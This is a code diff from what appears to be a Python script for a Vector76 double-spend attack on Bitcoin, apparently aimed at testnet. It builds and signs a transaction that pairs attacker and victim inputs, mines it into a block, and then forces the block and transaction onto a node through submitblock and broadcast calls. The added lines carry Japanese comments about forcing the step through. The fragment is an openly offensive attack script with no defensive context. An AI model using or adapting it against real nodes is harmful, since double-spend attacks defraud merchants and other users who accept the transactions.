@@ -96,12 +96,13 @@ tx_vector76 = f"{tx_attacker}{tx_victim}"
 tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
 print(tx_vector76)
 print("Sending Vector76 block your node...")
-result = rpc_node.sendrawtransaction(tx_vector76)
-print(f"result : {binascii.hexlify(result)}")
+#result = rpc_node.sendrawtransaction(tx_vector76)
+#print(f"result : {binascii.hexlify(result)}")
 print("Mining Vector76 block...")
 payload = [attacker_address, [tx_vector76], False]
 print(f"Payload : {payload}")
 vector76_response = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
+print()
 print(f"Mining Response : {vector76_response}")
 print()
 print("--------------------")
@@ -129,8 +130,10 @@ print(f"Send Vector76 Block...")
 result = rpc_node.submitblock(tx_vector76)
 print(result)
 print()
+#ゴリ押し
 broadcast_transaction(tx_vector76, testnet)
 broadcast_transaction(vector76_response, testnet)
+result = rpc_node.submitblock(vector76_response)  #ゴリ押し
 print()
 #おまけ
 print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
